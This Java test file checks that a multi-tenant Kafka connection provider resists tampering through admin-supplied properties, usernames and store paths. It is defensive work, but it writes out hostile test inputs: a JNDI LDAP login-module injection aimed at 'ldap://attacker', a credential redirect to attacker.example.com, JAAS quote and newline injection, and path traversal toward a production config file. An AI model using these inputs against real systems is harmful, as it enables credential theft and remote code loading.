package process.config;

import org.apache.kafka.common.config.SaslConfigs;
import org.apache.kafka.common.config.types.Password;
import org.apache.kafka.common.security.JaasContext;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;
import org.springframework.test.util.ReflectionTestUtils;
import process.model.dto.ObjectContentDto;
import process.model.pojo.KafkaConnectionProfile;
import process.model.service.StorageBrowserService;
import process.security.TenantContext;
import process.util.EncryptionUtil;

import javax.security.auth.login.AppConfigurationEntry;
import java.io.ByteArrayInputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.attribute.PosixFilePermission;
import java.nio.file.Paths;
import java.nio.file.attribute.PosixFilePermissions;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Map;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.Mockito.lenient;
import static org.mockito.Mockito.never;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;

/**
 * What a tenant admin's Advanced box, username and store paths are and are not allowed to decide.
 *
 * Everything a profile computes about authentication and transport is the security boundary; the
 * free-text fields around it are tuning. These check that the boundary is not writable from the
 * fields, and that key material fetched for a profile stays private to the process that fetched it.
 *
 * @author Nabeel Ahmed
 */
@ExtendWith(MockitoExtension.class)
class KafkaTemplateProviderSecurityTest {

    private static final long TENANT_A = 1001L;

    @Mock
    private EncryptionUtil encryptionUtil;
    @Mock
    private StorageBrowserService storageBrowserService;

    private KafkaTemplateProvider provider;

    @BeforeEach
    void setUp() {
        this.provider = new KafkaTemplateProvider(this.encryptionUtil, null, null, this.storageBrowserService);
        lenient().when(this.encryptionUtil.decrypt(anyString())).thenAnswer(call -> call.getArgument(0));
    }

    @AfterEach
    void tearDown() {
        TenantContext.clear();
    }

    private KafkaConnectionProfile profile(String securityProtocol) {
        KafkaConnectionProfile profile = new KafkaConnectionProfile();
        profile.setKafkaConnectionProfileId(42L);
        profile.setTenantId(TENANT_A);
        profile.setProfileName("orders");
        profile.setBootstrapServers("broker:9092");
        profile.setSecurityProtocol(securityProtocol);
        return profile;
    }

    @Test
    void theAdvancedBoxCannotDowngradeTheWireToPlaintext() {
        KafkaConnectionProfile profile = this.profile("SASL_PLAINTEXT");
        profile.setSaslMechanism("PLAIN");
        profile.setSaslUsername("svc");
        profile.setAdditionalProperties("{\"security.protocol\":\"PLAINTEXT\"}");

        Map<String, Object> props = this.provider.commonClientProps(profile);

        assertThat(props.get("security.protocol")).isEqualTo("SASL_PLAINTEXT");
    }

    @Test
    void theAdvancedBoxCannotNameALoginModule() {
        KafkaConnectionProfile profile = this.profile("SASL_PLAINTEXT");
        profile.setSaslMechanism("PLAIN");
        profile.setSaslUsername("svc");
        profile.setAdditionalProperties("{\"sasl.jaas.config\":"
            + "\"com.sun.security.auth.module.JndiLoginModule required user.provider.url=\\\"ldap://attacker/o\\\";\"}");

        Map<String, Object> props = this.provider.commonClientProps(profile);

        assertThat((String) props.get("sasl.jaas.config"))
            .doesNotContain("JndiLoginModule")
            .contains("org.apache.kafka.common.security.plain.PlainLoginModule");
    }

    @Test
    void theAdvancedBoxCannotPointTlsAtAnotherStore() {
        KafkaConnectionProfile profile = this.profile("PLAINTEXT");
        profile.setAdditionalProperties("{\"ssl.truststore.location\":\"/etc/ssl/attacker.jks\","
            + "\"ssl.endpoint.identification.algorithm\":\"\"}");

        Map<String, Object> props = this.provider.commonClientProps(profile);

        assertThat(props).doesNotContainKeys("ssl.truststore.location", "ssl.endpoint.identification.algorithm");
    }

    /**
     * bootstrap.servers is not a security setting to look at and is the destination the profile's
     * credentials are presented to. A profile that displayed one broker and dispatched to another
     * is how a stored password reaches a listener nobody approved.
     */
    @Test
    void theAdvancedBoxCannotSendTheProfileToAnotherBroker() {
        KafkaConnectionProfile profile = this.profile("SASL_PLAINTEXT");
        profile.setSaslMechanism("PLAIN");
        profile.setSaslUsername("svc");
        profile.setSaslPassword("p");
        profile.setAdditionalProperties("{\"bootstrap.servers\":\"attacker.example.com:9092\"}");

        Map<String, Object> props = this.provider.commonClientProps(profile);

        assertThat(props.get("bootstrap.servers")).isEqualTo("broker:9092");
    }

    @Test
    void theAdvancedBoxCannotNameAClassForThisJvmToLoad() {
        KafkaConnectionProfile profile = this.profile("PLAINTEXT");
        profile.setAdditionalProperties("{\"metric.reporters\":\"com.example.Reporter\","
            + "\"interceptor.classes\":\"com.example.Interceptor\"}");

        Map<String, Object> props = this.provider.commonClientProps(profile);

        assertThat(props).doesNotContainKeys("metric.reporters", "interceptor.classes");
    }

    @Test
    void ordinaryTuningStillGetsThrough() {
        KafkaConnectionProfile profile = this.profile("PLAINTEXT");
        profile.setAdditionalProperties("{\"request.timeout.ms\":\"20000\",\"client.id\":\"etl-console\"}");

        Map<String, Object> props = this.provider.commonClientProps(profile);

        assertThat(props.get("request.timeout.ms")).isEqualTo("20000");
        assertThat(props.get("client.id")).isEqualTo("etl-console");
        assertThat(props.get("bootstrap.servers")).isEqualTo("broker:9092");
    }

    @Test
    void reservednessIsDecidedOnTheKeyNotOnHowItWasTyped() {
        assertThat(KafkaTemplateProvider.isReservedClientProperty("  SASL.Jaas.Config ")).isTrue();
        assertThat(KafkaTemplateProvider.isReservedClientProperty("Security.Protocol")).isTrue();
        assertThat(KafkaTemplateProvider.isReservedClientProperty("ssl.engine.factory.class")).isTrue();
        assertThat(KafkaTemplateProvider.isReservedClientProperty(" Bootstrap.Servers ")).isTrue();
        assertThat(KafkaTemplateProvider.isReservedClientProperty("metric.reporters")).isTrue();
        assertThat(KafkaTemplateProvider.isReservedClientProperty("interceptor.classes")).isTrue();
        // Neighbouring names that are only tuning must keep working.
        assertThat(KafkaTemplateProvider.isReservedClientProperty("request.timeout.ms")).isFalse();
        assertThat(KafkaTemplateProvider.isReservedClientProperty("client.id")).isFalse();
    }

    @Test
    void aQuoteInTheUsernameCannotOpenASecondJaasOption() {
        KafkaConnectionProfile profile = this.profile("SASL_PLAINTEXT");
        profile.setSaslMechanism("PLAIN");
        profile.setSaslUsername("svc\" useFirstPass=\"true");
        profile.setSaslPassword("p");

        String jaas = (String) this.provider.commonClientProps(profile).get("sasl.jaas.config");

        assertThat(jaas).doesNotContain("\" useFirstPass=\"true\"");
        assertThat(jaas).contains("username=\"svc\\\" useFirstPass=\\\"true\"");
    }

    @Test
    void aBackslashInThePasswordIsCarriedThroughInsteadOfEscapingTheQuote() {
        KafkaConnectionProfile profile = this.profile("SASL_PLAINTEXT");
        profile.setSaslMechanism("PLAIN");
        profile.setSaslUsername("svc");
        profile.setSaslPassword("pa\\ss");

        String jaas = (String) this.provider.commonClientProps(profile).get("sasl.jaas.config");

        assertThat(jaas).isEqualTo("org.apache.kafka.common.security.plain.PlainLoginModule"
            + " required username=\"svc\" password=\"pa\\\\ss\";");
    }

    /**
     * A line break ends a quoted JAAS value exactly as a quote does, so a password containing one
     * used to fail the connection with a parse error instead of being used. Kafka's own parser is
     * the judge of whether the escaping is right, so it does the reading back here.
     */
    @Test
    void aPasswordWithALineBreakIsCarriedThroughAndOpensNothing() {
        KafkaConnectionProfile profile = this.profile("SASL_PLAINTEXT");
        profile.setSaslMechanism("PLAIN");
        profile.setSaslUsername("svc");
        profile.setSaslPassword("pa\nss\" useFirstPass=\"true");

        String jaas = (String) this.provider.commonClientProps(profile).get("sasl.jaas.config");
        List<AppConfigurationEntry> entries = JaasContext.loadClientContext(
            Collections.singletonMap(SaslConfigs.SASL_JAAS_CONFIG, new Password(jaas))).configurationEntries();

        assertThat(entries).hasSize(1);
        assertThat(entries.get(0).getLoginModuleName())
            .isEqualTo("org.apache.kafka.common.security.plain.PlainLoginModule");
        assertThat(entries.get(0).getOptions()).containsOnlyKeys("username", "password");
        assertThat(entries.get(0).getOptions().get("password")).isEqualTo("pa\nss\" useFirstPass=\"true");
    }

    @Test
    void aStoreWithNoBucketIsRefusedWhenNoLocalDirectoryIsConfigured() {
        KafkaConnectionProfile profile = this.profile("SSL");
        profile.setSslTruststoreLocation("/opt/app/config/application-prod.yml");

        assertThatThrownBy(() -> this.provider.commonClientProps(profile))
            .isInstanceOf(IllegalStateException.class)
            .hasMessageContaining("storage bucket is required");
    }

    @Test
    void aLocalStorePathCannotClimbOutOfTheConfiguredDirectory(@TempDir Path storeDir) {
        ReflectionTestUtils.setField(this.provider, "localStoreDir", storeDir.toString());
        KafkaConnectionProfile profile = this.profile("SSL");
        profile.setSslTruststoreLocation("../../opt/app/config/application-prod.yml");

        assertThatThrownBy(() -> this.provider.commonClientProps(profile))
            .isInstanceOf(IllegalStateException.class)
            .hasMessageContaining("outside kafka.ssl.local-store-dir");
    }

    @Test
    void aLocalStorePathInsideTheConfiguredDirectoryIsServed(@TempDir Path storeDir) {
        ReflectionTestUtils.setField(this.provider, "localStoreDir", storeDir.toString());
        KafkaConnectionProfile profile = this.profile("SSL");
        profile.setSslTruststoreLocation("certs/truststore.jks");

        String location = (String) this.provider.commonClientProps(profile).get("ssl.truststore.location");

        assertThat(location).endsWith("certs/truststore.jks");
    }

    @Test
    void aDownloadedStoreIsReadableOnlyByTheAccountThatFetchedIt(@TempDir Path cacheDir) throws Exception {
        ReflectionTestUtils.setField(this.provider, "secretCacheDir", cacheDir.toString());
        when(this.storageBrowserService.readForWorkflow(anyString(), anyString()))
            .thenAnswer(call -> new ObjectContentDto(
                new ByteArrayInputStream("store-bytes".getBytes(StandardCharsets.UTF_8)), "application/octet-stream", 11L, "truststore.jks"));
        KafkaConnectionProfile profile = this.profile("SSL");
        profile.setSslTruststoreBucket("tenant-a-bucket");
        profile.setSslTruststoreLocation("kafka-secrets/truststore.jks");
        TenantContext.set(TENANT_A, "TENANT_ADMIN", 7L, "admin");

        Path written = Paths.get(
            (String) this.provider.commonClientProps(profile).get("ssl.truststore.location"));

        assertThat(Files.readAllBytes(written)).isEqualTo("store-bytes".getBytes(StandardCharsets.UTF_8));
        assertThat(PosixFilePermissions.toString(Files.getPosixFilePermissions(written))).isEqualTo("rw-------");
        assertThat(PosixFilePermissions.toString(Files.getPosixFilePermissions(written.getParent()))).isEqualTo("rwx------");
    }

    /**
     * Every name under the cache root is derivable from the profile row, and the default root sits
     * in the shared temp dir. A local account that gets there first would own the parent of every
     * profile's key material -- able to read what is written and to plant a file the next connection
     * would take as that profile's trust anchor. So an open root fails the connection.
     */
    @Test
    void aCacheRootOtherAccountsCanEnterIsRefusedRatherThanUsed(@TempDir Path cacheDir) throws Exception {
        Path root = cacheDir.resolve("kafka-secrets-cache");
        Files.createDirectory(root);
        Files.setPosixFilePermissions(root, PosixFilePermissions.fromString("rwxrwxrwx"));
        ReflectionTestUtils.setField(this.provider, "secretCacheDir", root.toString());
        KafkaConnectionProfile profile = this.profile("SSL");
        profile.setSslTruststoreBucket("tenant-a-bucket");
        profile.setSslTruststoreLocation("kafka-secrets/truststore.jks");

        assertThatThrownBy(() -> this.provider.commonClientProps(profile))
            .isInstanceOf(IllegalStateException.class);
        // Nothing was downloaded into it either.
        verify(this.storageBrowserService, never()).readForWorkflow(anyString(), anyString());
    }

    @Test
    void aCacheRootTheProcessCreatesForItselfIsPrivate(@TempDir Path cacheDir) throws Exception {
        Path root = cacheDir.resolve("kafka-secrets-cache");
        ReflectionTestUtils.setField(this.provider, "secretCacheDir", root.toString());
        when(this.storageBrowserService.readForWorkflow(anyString(), anyString()))
            .thenAnswer(call -> new ObjectContentDto(
                new ByteArrayInputStream("store-bytes".getBytes(StandardCharsets.UTF_8)),
                "application/octet-stream", 11L, "truststore.jks"));
        KafkaConnectionProfile profile = this.profile("SSL");
        profile.setSslTruststoreBucket("tenant-a-bucket");
        profile.setSslTruststoreLocation("kafka-secrets/truststore.jks");

        this.provider.commonClientProps(profile);

        assertThat(PosixFilePermissions.toString(Files.getPosixFilePermissions(root))).isEqualTo("rwx------");
    }

    @Test
    void twoUnsavedProfilesNeverShareADownloadedStore(@TempDir Path cacheDir) {
        ReflectionTestUtils.setField(this.provider, "secretCacheDir", cacheDir.toString());
        List<String> requestedBuckets = new ArrayList<>();
        when(this.storageBrowserService.readForWorkflow(anyString(), anyString()))
            .thenAnswer(call -> {
                requestedBuckets.add(call.getArgument(0));
                return new ObjectContentDto(
                    new ByteArrayInputStream(("bytes-for-" + call.getArgument(0)).getBytes(StandardCharsets.UTF_8)),
                    "application/octet-stream", 1L, "truststore.jks");
            });
        TenantContext.set(TENANT_A, "TENANT_ADMIN", 7L, "admin");

        KafkaConnectionProfile tenantA = this.profile("SSL");
        tenantA.setKafkaConnectionProfileId(null);
        tenantA.setSslTruststoreBucket("bucket-a");
        tenantA.setSslTruststoreLocation("kafka-secrets/truststore.jks");
        KafkaConnectionProfile tenantB = this.profile("SSL");
        tenantB.setKafkaConnectionProfileId(null);
        tenantB.setSslTruststoreBucket("bucket-b");
        tenantB.setSslTruststoreLocation("kafka-secrets/truststore.jks");

        String first = (String) this.provider.commonClientProps(tenantA).get("ssl.truststore.location");
        String second = (String) this.provider.commonClientProps(tenantB).get("ssl.truststore.location");

        assertThat(second).isNotEqualTo(first);
        // The second test must have gone to its own bucket rather than reading the first one's file.
        assertThat(requestedBuckets).containsExactly("bucket-a", "bucket-b");
    }

    /**
     * The gap this closes: a profile could be tested successfully from the console and then fail
     * on every dispatch afterwards, because a scheduler thread has no principal to authorise and
     * the material usually sits in the platform's own bucket.
     */
    @Test
    void aBackgroundThreadWithNoPrincipalStillFetchesAndLeavesNoContextBehind(@TempDir Path cacheDir) {
        ReflectionTestUtils.setField(this.provider, "secretCacheDir", cacheDir.toString());
        List<Long> seenTenantIds = new ArrayList<>();
        List<String> seenRoles = new ArrayList<>();
        when(this.storageBrowserService.readForWorkflow(anyString(), anyString()))
            .thenAnswer(call -> {
                seenTenantIds.add(TenantContext.getTenantId());
                seenRoles.add(TenantContext.getUserRole());
                return new ObjectContentDto(
                    new ByteArrayInputStream("store-bytes".getBytes(StandardCharsets.UTF_8)),
                    "application/octet-stream", 11L, "truststore.jks");
            });
        KafkaConnectionProfile profile = this.profile("SSL");
        profile.setSslTruststoreBucket("tenant-a-bucket");
        profile.setSslTruststoreLocation("kafka-secrets/truststore.jks");

        // No TenantContext at all -- a scheduler dispatch or the startup topic provisioner.
        Map<String, Object> props = this.provider.commonClientProps(profile);

        assertThat(props).containsKey("ssl.truststore.location");
        // Nothing is fabricated to get past the guard: the trusted read is authorised by the
        // profile row the bucket and key were taken from, not by a principal invented here.
        assertThat(seenTenantIds).containsExactly((Long) null);
        assertThat(seenRoles).containsExactly((String) null);
        assertThat(TenantContext.getTenantId()).isNull();
        assertThat(TenantContext.getUserRole()).isNull();
    }

    @Test
    void aRequestThreadsOwnContextIsNeverReplacedByTheProfilesTenant(@TempDir Path cacheDir) {
        ReflectionTestUtils.setField(this.provider, "secretCacheDir", cacheDir.toString());
        List<Long> seenTenantIds = new ArrayList<>();
        when(this.storageBrowserService.readForWorkflow(anyString(), anyString()))
            .thenAnswer(call -> {
                seenTenantIds.add(TenantContext.getTenantId());
                return new ObjectContentDto(
                    new ByteArrayInputStream("store-bytes".getBytes(StandardCharsets.UTF_8)),
                    "application/octet-stream", 11L, "truststore.jks");
            });
        KafkaConnectionProfile profile = this.profile("SSL");
        profile.setSslTruststoreBucket("tenant-a-bucket");
        profile.setSslTruststoreLocation("kafka-secrets/truststore.jks");
        TenantContext.set(2002L, "TENANT_ADMIN", 9L, "other");

        this.provider.commonClientProps(profile);

        assertThat(seenTenantIds).containsExactly(2002L);
        assertThat(TenantContext.getTenantId()).isEqualTo(2002L);
    }


    /**
     * Kafka defaults ssl.*.type to JKS while everything this application generates is PKCS12.
     * JDK 9+ hides that with keystore.type.compat, so the mismatch is latent on the image's JDK 17
     * rather than broken -- and would surface on a Java 8 runtime, or with that property off, at
     * the first handshake. Pinned here so the client is told the truth either way.
     */
    @Test
    void aGeneratedPkcs12StoreIsDeclaredAsPkcs12(@TempDir Path cacheDir) {
        ReflectionTestUtils.setField(this.provider, "secretCacheDir", cacheDir.toString());
        when(this.storageBrowserService.readForWorkflow(anyString(), anyString()))
            .thenAnswer(call -> new ObjectContentDto(
                new ByteArrayInputStream("store-bytes".getBytes(StandardCharsets.UTF_8)),
                "application/octet-stream", 11L, "truststore.p12"));
        KafkaConnectionProfile profile = this.profile("SSL");
        profile.setSslTruststoreBucket("etl-bucket");
        profile.setSslTruststoreLocation("kafka-secrets/7/uuid/2026-08-31/truststore.p12");

        Map<String, Object> props = this.provider.commonClientProps(profile);

        assertThat(props.get("ssl.truststore.type")).isEqualTo("PKCS12");
    }

    /** Someone who ran keytool themselves keeps whichever format they made. */
    @Test
    void anUploadedJksStoreIsStillDeclaredAsJks(@TempDir Path cacheDir) {
        ReflectionTestUtils.setField(this.provider, "secretCacheDir", cacheDir.toString());
        when(this.storageBrowserService.readForWorkflow(anyString(), anyString()))
            .thenAnswer(call -> new ObjectContentDto(
                new ByteArrayInputStream("store-bytes".getBytes(StandardCharsets.UTF_8)),
                "application/octet-stream", 11L, "truststore.jks"));
        KafkaConnectionProfile profile = this.profile("SSL");
        profile.setSslTruststoreBucket("etl-bucket");
        profile.setSslTruststoreLocation("kafka-secrets/7/uuid/2026-08-31/truststore.jks");

        Map<String, Object> props = this.provider.commonClientProps(profile);

        assertThat(props.get("ssl.truststore.type")).isEqualTo("JKS");
    }


    /**
     * An upgrade finding the cache directory already there, created before this check existed.
     *
     * Every test until now handed the provider a fresh @TempDir, which java.nio creates at 0700 --
     * so the one state that actually occurs in a running deployment, a 0755 directory left by an
     * older build, was the one state never exercised. It failed every TLS connection permanently,
     * and the message pointed at a configuration property rather than at the directory.
     */
    @Test
    void aCacheDirectoryLeftOpenByAnEarlierBuildIsNarrowedRatherThanRefused(@TempDir Path parent)
        throws Exception {
        Path root = parent.resolve("kafka-secrets-cache");
        Files.createDirectory(root);
        Files.setPosixFilePermissions(root, PosixFilePermissions.fromString("rwxr-xr-x"));
        ReflectionTestUtils.setField(this.provider, "secretCacheDir", root.toString());
        when(this.storageBrowserService.readForWorkflow(anyString(), anyString()))
            .thenAnswer(call -> new ObjectContentDto(
                new ByteArrayInputStream("store-bytes".getBytes(StandardCharsets.UTF_8)),
                "application/octet-stream", 11L, "truststore.p12"));
        KafkaConnectionProfile profile = this.profile("SSL");
        profile.setSslTruststoreBucket("etl-bucket");
        profile.setSslTruststoreLocation("kafka-secrets/7/uuid/2026-08-31/truststore.p12");

        Map<String, Object> props = this.provider.commonClientProps(profile);

        assertThat(props).containsKey("ssl.truststore.location");
        assertThat(Files.getPosixFilePermissions(root))
            .as("the directory this process owns is tightened, not rejected")
            .containsExactlyInAnyOrder(PosixFilePermission.OWNER_READ,
                PosixFilePermission.OWNER_WRITE, PosixFilePermission.OWNER_EXECUTE);
    }

}
